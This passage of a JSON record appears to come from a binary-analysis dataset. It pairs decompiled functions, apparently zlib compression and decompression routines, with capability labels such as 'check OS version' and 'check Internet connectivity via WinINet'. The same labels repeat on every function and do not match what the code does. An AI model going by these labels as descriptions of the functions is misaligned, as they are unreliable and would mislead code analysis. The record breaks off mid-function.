        "decompiled_code": "\nulong __fastcall fcn.004681c8(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if ((((in_EAX == NULL) || (in_EAX[7] == 0)) || (4 < param_2)) || (param_2 < 0)) {\n        uVar3 = 0xfffffffe;\n    }\n    else {\n        ppiVar1 = in_EAX[7];\n        if (((in_EAX[3] == 0) || ((*in_EAX == 0 && (in_EAX[1] != 0)))) || ((ppiVar1[1] == 0x29a && (param_2 != 0x4)))) {\n            in_EAX[6] = *0x493b04;\n            uVar3 = 0xfffffffe;\n        }\n        else if (in_EAX[4] == 0) {\n            uVar3 = 0xfffffffb;\n            in_EAX[6] = *0x493b10;\n        }\n        else {\n            *ppiVar1 = in_EAX;\n            piVar2 = ppiVar1[9];\n            ppiVar1[9] = param_2;\n            if (ppiVar1[1] == 0x2a) {\n                ppiVar1[1] = 0x71;\n                fcn.0046814c();\n                if (ppiVar1[0x1a] != NULL) {\n                    fcn.0046814c();\n                    fcn.0046814c();\n                }\n                iVar4 = fcn.00467904();\n                in_EAX[0xc] = iVar4;\n            }\n            if (ppiVar1[5] == NULL) {\n                if (((in_EAX[1] == 0) && (param_2 <= piVar2)) && (param_2 != 0x4)) {\n                    uVar3 = 0xfffffffb;\n                    in_EAX[6] = *0x493b10;\n                    goto code_r0x00468483;\n                }\n            }\n            else {\n                fcn.00468174();\n                if (in_EAX[4] == 0) {\n                    ppiVar1[9] = 0xffffffff;\n                    uVar3 = 0;\n                    goto code_r0x00468483;\n                }\n            }\n            if ((ppiVar1[1] == 0x29a) && (in_EAX[1] != 0)) {\n                uVar3 = 0xfffffffb;\n                in_EAX[6] = *0x493b10;\n            }\n            else {\n                if (((in_EAX[1] != 0) || (ppiVar1[0x1c] != NULL)) || ((param_2 != NULL && (ppiVar1[1] != 0x29a)))) {\n                    param_1 = (**(ppiVar1[0x20] * 0xc + 0x493b28))();\n                    if ((param_1 == 2) || (param_1 == 3)) {\n                        ppiVar1[1] = 0x29a;\n                    }\n                    if ((param_1 == 0) || (param_1 == 2)) {\n                        if (in_EAX[4] == 0) {\n                            ppiVar1[9] = 0xffffffff;\n                        }\n                        uVar3 = 0;\n                        goto code_r0x00468483;\n                    }\n                    if (param_1 == 1) {\n                        if (param_2 == 0x1) {\n                            fcn.0046c3b4();\n                        }\n                        else {\n                            param_1 = 0;\n                            fcn.0046c2f8(0);\n                            if (param_2 == 0x3) {\n                                *(ppiVar1[0x10] + ppiVar1[0x12] * 2 + -2) = 0;\n                                fcn.00467644(ppiVar1[0x10], 0, (ppiVar1[0x12] + -1) * 2);\n                            }\n                        }\n                        fcn.00468174();\n                        if (in_EAX[4] == 0) {\n                            ppiVar1[9] = 0xffffffff;\n                            uVar3 = 0;\n                            goto code_r0x00468483;\n                        }\n                    }\n                }\n                if (param_2 == 0x4) {\n                    if (ppiVar1[6] < 1) {\n                        uVar3 = 1;\n                    }\n                    else {\n                        fcn.0046814c();\n                        fcn.0046814c();\n                        fcn.00468174();\n                        if (0 < ppiVar1[6]) {\n                            ppiVar1[6] = -ppiVar1[6];\n                        }\n                        if (ppiVar1[5] == NULL) {\n                            uVar3 = 1;\n                        }\n                        else {\n                            uVar3 = 0;\n                        }\n                    }\n                }\n                else {\n                    uVar3 = 0;\n                }\n            }\n        }\n    }\ncode_r0x00468483:\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 1171
    },
    "0046848c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046848c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((in_EAX == 0) || (*(in_EAX + 0x1c) == 0)) {\n        return 0xfffffffe;\n    }\n    iVar1 = *(*(in_EAX + 0x1c) + 4);\n    if (((iVar1 != 0x2a) && (((iVar1 != 0x45 && (iVar1 != 0x49)) && (iVar1 != 0x5b)))) &&\n       (((iVar1 != 0x67 && (iVar1 != 0x71)) && (iVar1 != 0x29a)))) {\n        return 0xfffffffe;\n    }\n    if (*(*(in_EAX + 0x1c) + 8) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x40) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x3c) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x34) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    (**(in_EAX + 0x24))();\n    *(in_EAX + 0x1c) = 0;\n    if (iVar1 == 0x71) {\n        uVar2 = 0xfffffffd;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 405
    },
    "004689e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004689e8(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    uint32_t arg_10h;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    uint16_t *puVar5;\n    \n    arg_10h = in_EAX[10];\n    while( true ) {\n        uVar2 = in_EAX[10] + -0x106 + arg_10h;\n        if (uVar2 < in_EAX[0x1a] || uVar2 == in_EAX[0x1a]) {\n            fcn.00467658(in_EAX[0xd], in_EAX[0xd] + arg_10h, arg_10h);\n            in_EAX[0x1b] = in_EAX[0x1b] - arg_10h;\n            in_EAX[0x1a] = in_EAX[0x1a] - arg_10h;\n            in_EAX[0x16] = in_EAX[0x16] - arg_10h;\n            iVar3 = in_EAX[0x12];\n            puVar5 = iVar3 * 2 + in_EAX[0x10];\n            do {\n                puVar5 = puVar5 + -1;\n                if (*puVar5 < arg_10h) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = *puVar5 - arg_10h;\n                }\n                *puVar5 = uVar4;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            puVar5 = arg_10h * 2 + in_EAX[0xf];\n            uVar2 = arg_10h;\n            do {\n                puVar5 = puVar5 + -1;\n                param_1 = *puVar5;\n                if (param_1 < arg_10h) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = *puVar5 - arg_10h;\n                }\n                *puVar5 = uVar4;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        if (*(*in_EAX + 4) == 0) break;\n        iVar3 = fcn.004686d8(param_1);\n        in_EAX[0x1c] = in_EAX[0x1c] + iVar3;\n        if (2 < in_EAX[0x1c]) {\n            uVar1 = *(in_EAX[0xd] + in_EAX[0x1a]);\n            in_EAX[0x11] = uVar1;\n            in_EAX[0x11] = (uVar1 << (in_EAX[0x15] & 0x1f) ^ *(in_EAX[0xd] + 1 + in_EAX[0x1a])) & in_EAX[0x14];\n        }\n        if (0x105 < in_EAX[0x1c]) {\n            return;\n        }\n        if (*(*in_EAX + 4) == 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 730
    },
    "00469860": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00469860(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    \n    if ((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) {\n        puVar2 = *(in_EAX + 0x1c);\n        puVar2[7] = 0;\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *(in_EAX + 0x30) = 1;\n        *puVar2 = 0;\n        puVar2[1] = 0;\n        puVar2[3] = 0;\n        puVar2[5] = 0x8000;\n        puVar2[9] = 0;\n        puVar2[10] = 0;\n        puVar2[0xb] = 0;\n        puVar2[0xd] = 0;\n        puVar1 = puVar2 + 0x14b;\n        puVar2[0xe] = 0;\n        puVar2[0x1a] = puVar1;\n        puVar2[0x13] = puVar1;\n        puVar2[0x12] = puVar1;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 322
    },
    "00469918": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00469918(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char *in_ECX;\n    int32_t in_EDX;\n    int32_t var_4h;\n    \n    if (((in_ECX == NULL) || (*in_ECX != *0x4944ca)) || (arg_8h != 0x38)) {\n        uVar1 = 0xfffffffa;\n    }\n    else if (in_EAX == 0) {\n        uVar1 = 0xfffffffe;\n    }\n    else {\n        *(in_EAX + 0x18) = 0;\n        if (*(in_EAX + 0x20) == 0) {\n            *(in_EAX + 0x20) = 0x467630;\n            *(in_EAX + 0x28) = 0;\n        }\n        if (*(in_EAX + 0x24) == 0) {\n            *(in_EAX + 0x24) = 0x46763c;\n        }\n        iVar2 = (**(in_EAX + 0x20))();\n        if (iVar2 == 0) {\n            uVar1 = 0xfffffffc;\n        }\n        else {\n            *(in_EAX + 0x1c) = iVar2;\n            if (in_EDX < 0) {\n                *(iVar2 + 8) = 0;\n                var_4h = -in_EDX;\n            }\n            else {\n                *(iVar2 + 8) = (in_EDX >> 4) + 1;\n                var_4h = in_EDX;\n            }\n            if ((var_4h < 8) || (0xf < var_4h)) {\n                (**(in_EAX + 0x24))();\n                uVar1 = 0xfffffffe;\n                *(in_EAX + 0x1c) = 0;\n            }\n            else {\n                *(iVar2 + 0x20) = var_4h;\n                *(iVar2 + 0x30) = 0;\n                uVar1 = fcn.00469860();\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 494
    },
    "00469a14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00469a14(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    iVar1 = *(in_EAX + 0x1c);\n    if (*(iVar1 + 0x30) == 0) {\n        iVar2 = (**(in_EAX + 0x20))();\n        *(iVar1 + 0x30) = iVar2;\n        if (iVar2 == 0) {\n            uVar3 = 1;\n            goto code_r0x00469b13;\n        }\n    }\n    if (*(iVar1 + 0x24) == 0) {\n        *(iVar1 + 0x24) = 1 << (*(iVar1 + 0x20) & 0x1f);\n        *(iVar1 + 0x2c) = 0;\n        *(iVar1 + 0x28) = 0;\n    }\n    uVar4 = param_2 - *(in_EAX + 0x10);\n    uVar5 = *(iVar1 + 0x24);\n    if (uVar4 < uVar5) {\n        uVar5 = *(iVar1 + 0x24) - *(iVar1 + 0x2c);\n        if (uVar4 < uVar5) {\n            uVar5 = uVar4;\n        }\n        fcn.00467658(*(iVar1 + 0x30) + *(iVar1 + 0x2c), *(in_EAX + 0xc) - uVar4, uVar5);\n        iVar2 = uVar4 - uVar5;\n        if (iVar2 == 0) {\n            *(iVar1 + 0x2c) = *(iVar1 + 0x2c) + uVar5;\n            if (*(iVar1 + 0x2c) == *(iVar1 + 0x24)) {\n                *(iVar1 + 0x2c) = 0;\n            }\n            if (*(iVar1 + 0x28) < *(iVar1 + 0x24)) {\n                *(iVar1 + 0x28) = *(iVar1 + 0x28) + uVar5;\n            }\n        }\n        else {\n            fcn.00467658(*(iVar1 + 0x30), *(in_EAX + 0xc) - iVar2, iVar2);\n            *(iVar1 + 0x2c) = iVar2;\n            *(iVar1 + 0x28) = *(iVar1 + 0x24);\n        }\n    }\n    else {\n        fcn.00467658(*(iVar1 + 0x30), *(in_EAX + 0xc) - uVar5, uVar5);\n        *(iVar1 + 0x2c) = 0;\n        *(iVar1 + 0x28) = *(iVar1 + 0x24);\n    }\n    uVar3 = 0;\ncode_r0x00469b13:\n    return CONCAT44(in_EAX, uVar3);\n}\n",
        "token_count": 696
    },
    "0046a9d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046a9d4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        if (*(*(in_EAX + 0x1c) + 0x30) != 0) {\n            (**(in_EAX + 0x24))();\n        }\n        (**(in_EAX + 0x24))();\n        *(in_EAX + 0x1c) = 0;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 149
    },
    "0046ad44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0046ad44(uint16_t *arg_8h, uint32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    int32_t in_EAX;\n    uint *puVar5;\n    uint uVar6;\n    uint16_t *puVar7;\n    uint32_t uVar8;\n    uint32_t in_ECX;\n    int32_t iVar9;\n    uint8_t uVar10;\n    uint16_t *in_EDX;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint16_t var_84h;\n    uint var_82h;\n    uint var_64h;\n    uint16_t *var_46h;\n    int32_t var_40h;\n    uint16_t *var_3ch;\n    uint16_t *var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint16_t *var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    puVar5 = &var_64h;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    do {\n        *puVar5 = 0;\n        var_ch = var_ch + 1;\n        puVar5 = puVar5 + 2;\n    } while (var_ch < 0x10);\n    uVar11 = 0;\n    puVar7 = var_8h;\n    if (in_ECX != 0) {\n        do {\n            uVar3 = *puVar7;\n            puVar7 = puVar7 + 1;\n            uVar11 = uVar11 + 1;\n            piVar1 = &var_64h + uVar3 * 2;\n            *piVar1 = *piVar1 + 1;\n        } while (uVar11 < in_ECX);\n    }\n    puVar5 = &var_46h;\n    var_18h = *arg_ch;\n    var_14h = 0xf;\n    do {\n        if (*puVar5 != 0) break;\n        var_14h = var_14h - 1;\n        puVar5 = puVar5 + -2;\n    } while (var_14h != 0);\n    if (var_14h < *arg_ch) {\n        var_18h = var_14h;\n    }\n    if (var_14h == 0) {\n        puVar5 = *arg_10h;\n        *arg_10h = *arg_10h + 4;\n        *puVar5 = 0x140;\n        puVar5 = *arg_10h;\n        *arg_10h = *arg_10h + 4;\n        *puVar5 = 0x140;\n        uVar6 = 0;\n        *arg_ch = 1;\n    }\n    else {\n        var_10h = 1;\n        stack0xffffffb8 = &var_64h + 2;\n        do {\n            if (*stack0xffffffb8 != 0) break;\n            var_10h = var_10h + 1;\n            stack0xffffffb8 = stack0xffffffb8 + 1;\n        } while (var_10h < 0x10);\n        if (var_18h < var_10h) {\n            var_18h = var_10h;\n        }\n        var_ch = 1;\n        iVar12 = 1;\n        puVar7 = &var_64h + 2;\n        do {\n            iVar12 = iVar12 * 2 - *puVar7;\n            if (iVar12 < 0) {\n                return 0xffffffff;\n            }\n            var_ch = var_ch + 1;\n            puVar7 = puVar7 + 1;\n        } while (var_ch < 0x10);\n        if ((iVar12 < 1) || ((var_4h != 0 && (var_14h == 1)))) {\n            var_82h._0_2_ = 0;\n            var_ch = 1;\n            puVar5 = &var_82h;\n            stack0xffffffb8 = &var_64h + 2;\n            do {\n                *(puVar5 + 2) = *puVar5 + *stack0xffffffb8;\n                puVar5 = puVar5 + 2;\n                var_ch = var_ch + 1;\n                stack0xffffffb8 = stack0xffffffb8 + 1;\n            } while (var_ch < 0xf);\n            uVar11 = 0;\n            stack0xffffffb8 = var_8h;\n            if (in_ECX != 0) {\n                do {\n                    uVar3 = *stack0xffffffb8;\n                    if (uVar3 != 0) {\n                        uVar2 = (&var_84h)[uVar3];\n                        (&var_84h)[uVar3] = (&var_84h)[uVar3] + 1;\n                        arg_8h[uVar2] = uVar11;\n                    }\n                    uVar11 = uVar11 + 1;\n                    stack0xffffffb8 = stack0xffffffb8 + 1;\n                } while (uVar11 < in_ECX);\n            }\n            if (var_4h == 0) {\n                var_3ch = arg_8h;\n                var_38h = arg_8h;\n                var_40h = 0x13;\n            }\n            else if (var_4h == 1) {\n                var_38h = 0x494432;\n                var_3ch = 0x494470;\n                var_40h = 0x100;\n            }\n            else {\n                var_38h = 0x4946b0;\n                var_3ch = 0x4946f0;\n                var_40h = -1;\n            }\n            var_ch = var_10h;\n            uVar11 = 0;\n            var_34h = *arg_10h;\n            var_1ch = 0;\n            var_28h = 0xffffffff;\n            var_20h = 1 << (var_18h & 0x1f);\n            var_2ch = var_20h - 1;\n            if ((var_4h != 1) || (var_20h < 0x5b0)) {\n                stack0xffffffb8 = arg_8h;\n                uVar8 = var_18h;\n                while( true ) {\n                    do {\n                        uVar4 = var_ch;\n                        uVar10 = var_ch - var_1ch;\n                        uVar13 = *stack0xffffffb8;\n                        if (uVar13 < var_40h) {\n                            var_30h = uVar10 << 8;\n                            var_30h = var_30h | *stack0xffffffb8 << 0x10;\n                        }\n                        else if (var_40h < uVar13) {\n                            var_30h = CONCAT22(var_38h[uVar13], CONCAT11(uVar10, *(var_3ch + uVar13)));\n                        }\n                        else {\n                            var_30h = CONCAT31(uVar10, 0x60);\n                        }\n                        var_24h = 1 << (uVar8 & 0x1f);\n                        var_10h = var_24h;\n                        do {\n                            var_24h = var_24h - (1 << (var_ch - var_1ch & 0x1f));\n                            *(var_34h + ((uVar11 >> (var_1ch & 0x1f)) + var_24h) * 4) = var_30h;\n                        } while (var_24h != 0);\n                        for (uVar13 = 1 << (var_ch - 1U & 0x1f); (uVar13 & uVar11) != 0; uVar13 = uVar13 >> 1) {\n                        }\n                        if (uVar13 == 0) {\n                            uVar11 = 0;\n                        }\n                        else {\n                            uVar11 = (uVar11 & uVar13 - 1) + uVar13;\n                        }\n                        stack0xffffffb8 = stack0xffffffb8 + 1;\n                        piVar1 = &var_64h + var_ch * 2;\n                        *piVar1 = *piVar1 + -1;\n                        if (*(&var_64h + uVar4 * 2) == 0) {\n                            if (var_ch == var_14h) {\n                                var_30h._0_2_ = CONCAT11(var_ch - var_1ch, 0x40);\n                                var_30h = var_30h;\n                                while (uVar11 != 0) {\n                                    if ((var_1ch != 0) && ((var_2ch & uVar11) != var_28h)) {\n                                        var_1ch = 0;\n                                        var_ch = var_18h;\n                                        var_34h = *arg_10h;\n                                        var_30h._0_2_ = CONCAT11(var_18h, var_30h);\n                                        var_30h = var_30h;\n                                    }\n                                    *(var_34h + (uVar11 >> (var_1ch & 0x1f)) * 4) = var_30h;\n                                    for (uVar8 = 1 << (var_ch - 1U & 0x1f); (uVar8 & uVar11) != 0; uVar8 = uVar8 >> 1) {\n                                    }\n                                    if (uVar8 == 0) {\n                                        uVar11 = 0;\n                                    }\n                                    else {\n                                        uVar11 = (uVar11 & uVar8 - 1) + uVar8;\n                                    }\n                                }\n                                *arg_10h = *arg_10h + var_20h * 4;\n                                *arg_ch = var_18h;\n                                return 0;\n                            }\n                            var_ch = var_8h[*stack0xffffffb8];\n                        }\n                    } while ((var_ch <= var_18h) || ((var_2ch & uVar11) == var_28h));\n                    if (var_1ch == 0) {\n                        var_1ch = var_18h;\n                    }\n                    var_34h = var_34h + var_10h * 4;\n                    uVar8 = var_ch - var_1ch;\n                    for (iVar12 = 1 << (uVar8 & 0x1f);\n                        (var_1ch + uVar8 < var_14h &&\n                        (iVar12 = iVar12 - *(&var_64h + (var_1ch + uVar8) * 2),  0 < iVar12)); iVar12 = iVar12 * 2) {\n                        uVar8 = uVar8 + 1;\n                    }\n                    var_20h = var_20h + (1 << (uVar8 & 0x1f));\n                    if ((var_4h == 1) && (0x5af < var_20h)) break;\n                    var_28h = var_2ch & uVar11;\n                    iVar12 = *arg_10h;\n                    *(iVar12 + var_28h * 4) = uVar8;\n                    *(iVar12 + 1 + var_28h * 4) = var_18h;\n                    iVar9 = var_34h - iVar12;\n                    if (iVar9 < 0) {\n                        iVar9 = iVar9 + 3;\n                    }\n                    *(iVar12 + 2 + var_28h * 4) = iVar9 >> 2;\n                }\n                return 1;\n            }\n            uVar6 = 1;\n        }\n        else {\n            uVar6 = 0xffffffff;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 2739
    },
    "0046b388": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b388(uint param_1, int32_t *param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    int32_t *piVar7;\n    ushort *puVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack24;\n    \n    iVar3 = param_2[1];\n    iVar4 = *param_2;\n    piVar7 = param_2[2];\n    iVar12 = *piVar7;\n    iVar5 = piVar7[1];\n    iVar6 = piVar7[2];\n    uVar13 = piVar7[4];\n    iStack24 = 0;\n    iVar10 = 0;\n    puVar8 = in_EAX + 0xb38;\n    do {\n        *puVar8 = 0;\n        iVar10 = iVar10 + 1;\n        puVar8 = puVar8 + 1;\n    } while (iVar10 < 0x10);\n    *(iVar4 + 2 + *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) * 4) = 0;\n    iStack36 = *(in_EAX + 0x1450) + 1;\n    piVar7 = in_EAX + 0xb58 + iStack36 * 4;\n    for (; iStack36 < 0x23d; iStack36 = iStack36 + 1) {\n        iVar10 = *piVar7;\n        uVar11 = *(iVar4 + 2 + *(iVar4 + 2 + iVar10 * 4) * 4) + 1;\n        if (uVar13 < uVar11) {\n            iStack24 = iStack24 + 1;\n            uVar11 = uVar13;\n        }\n        *(iVar4 + 2 + iVar10 * 4) = uVar11;\n        if (iVar10 <= iVar3) {\n            piVar9 = in_EAX + 0xb38 + uVar11 * 2;\n            *piVar9 = *piVar9 + 1;\n            iStack32 = 0;\n            if (iVar6 <= iVar10) {\n                iStack32 = *(iVar5 + (iVar10 - iVar6) * 4);\n            }\n            uVar2 = *(iVar4 + iVar10 * 4);\n            *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + uVar2 * (uVar11 + iStack32);\n            if (iVar12 != 0) {\n                *(in_EAX + 0x16a8) = *(in_EAX + 0x16a8) + (*(iVar12 + 2 + iVar10 * 4) + iStack32) * uVar2;\n            }\n        }\n        piVar7 = piVar7 + 1;\n    }\n    if (iStack24 != 0) {\n        do {\n            iVar12 = uVar13 - 1;\n            for (piVar9 = in_EAX + 0xb38 + iVar12 * 2; *piVar9 == 0; piVar9 = piVar9 + -1) {\n                iVar12 = iVar12 + -1;\n            }\n            piVar9 = in_EAX + 0xb38 + iVar12 * 2;\n            *piVar9 = *piVar9 + -1;\n            piVar9 = in_EAX + 0xb3a + iVar12 * 2;\n            *piVar9 = *piVar9 + 2;\n            piVar9 = in_EAX + 0xb38 + uVar13 * 2;\n            *piVar9 = *piVar9 + -1;\n            iStack24 = iStack24 + -2;\n        } while (0 < iStack24);\n        puVar1 = in_EAX + 0xb38 + uVar13 * 2;\n        for (; uVar13 != 0; uVar13 = uVar13 - 1) {\n            uVar11 = *puVar1;\n            while (piVar7 = in_EAX + 0xb58 + iStack36 * 4,  uVar11 != 0) {\n                while( true ) {\n                    iStack36 = iStack36 + -1;\n                    piVar7 = piVar7 + -1;\n                    iVar12 = *piVar7;\n                    if (iVar3 < iVar12) break;\n                    if (*(iVar4 + 2 + iVar12 * 4) != uVar13) {\n                        *(in_EAX + 0x16a4) =\n                             *(in_EAX + 0x16a4) + (uVar13 - *(iVar4 + 2 + iVar12 * 4)) * *(iVar4 + iVar12 * 4);\n                        *(iVar4 + 2 + iVar12 * 4) = uVar13;\n                    }\n                    uVar11 = uVar11 - 1;\n                    if (uVar11 == 0) goto code_r0x0046b575;\n                }\n            }\ncode_r0x0046b575:\n            puVar1 = puVar1 + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 1228
    },
    "0046b5f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b5f8(uint param_1, int16_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    int16_t *piVar5;\n    char cVar6;\n    uchar *puVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int16_t *piStack20;\n    \n    piVar8 = NULL;\n    piVar3 = *param_2;\n    iVar9 = *param_2[2];\n    puVar7 = in_EAX + 0x1454;\n    iVar10 = *(param_2[2] + 0xc);\n    piStack20 = 0xffffffff;\n    *(in_EAX + 0x144c) = 0;\n    *(in_EAX + 0x1450) = 0x23d;\n    piVar5 = piVar3;\n    if (0 < iVar10) {\n        do {\n            if (*piVar5 == 0) {\n                piVar5[1] = 0;\n            }\n            else {\n                *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + 1;\n                *(in_EAX + 0xb58 + *(in_EAX + 0x144c) * 4) = piVar8;\n                *puVar7 = 0;\n                piStack20 = piVar8;\n            }\n            piVar8 = piVar8 + 1;\n            puVar7 = puVar7 + 1;\n            piVar5 = piVar5 + 2;\n        } while (piVar8 < iVar10);\n    }\n    while (*(in_EAX + 0x144c) < 2) {\n        if (piStack20 < 2) {\n            piVar5 = piStack20 + 1;\n            piStack20 = piVar5;\n        }\n        else {\n            piVar5 = NULL;\n        }\n        *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + 1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x144c) * 4) = piVar5;\n        piVar3[piVar5 * 2] = 1;\n        *(in_EAX + 0x1454 + piVar5) = 0;\n        *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + -1;\n        if (iVar9 != 0) {\n            *(in_EAX + 0x16a8) = *(in_EAX + 0x16a8) - *(iVar9 + 2 + piVar5 * 4);\n        }\n    }\n    param_2[1] = piStack20;\n    iVar9 = *(in_EAX + 0x144c) >> 1;\n    if (iVar9 < 0) {\n        iVar9 = iVar9 + ((*(in_EAX + 0x144c) & 1) != 0);\n    }\n    for (; 0 < iVar9; iVar9 = iVar9 + -1) {\n        fcn.0046b294();\n    }\n    do {\n        iVar9 = *(in_EAX + 0x144c);\n        iVar4 = *(in_EAX + 0xb5c);\n        *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + -1;\n        *(in_EAX + 0xb5c) = *(in_EAX + 0xb58 + iVar9 * 4);\n        fcn.0046b294();\n        iVar9 = *(in_EAX + 0xb5c);\n        *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = iVar4;\n        *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = iVar9;\n        piVar3[iVar10 * 2] = piVar3[iVar9 * 2] + piVar3[iVar4 * 2];\n        uVar2 = *(in_EAX + 0x1454 + iVar9);\n        puVar1 = in_EAX + 0x1454 + iVar4;\n        if (uVar2 < *puVar1 || uVar2 == *puVar1) {\n            cVar6 = *(in_EAX + 0x1454 + iVar4);\n        }\n        else {\n            cVar6 = *(in_EAX + 0x1454 + iVar9);\n        }\n        *(in_EAX + 0x1454 + iVar10) = cVar6 + '\\x01';\n        piVar3[iVar9 * 2 + 1] = iVar10;\n        piVar3[iVar4 * 2 + 1] = iVar10;\n        *(in_EAX + 0xb5c) = iVar10;\n        iVar10 = 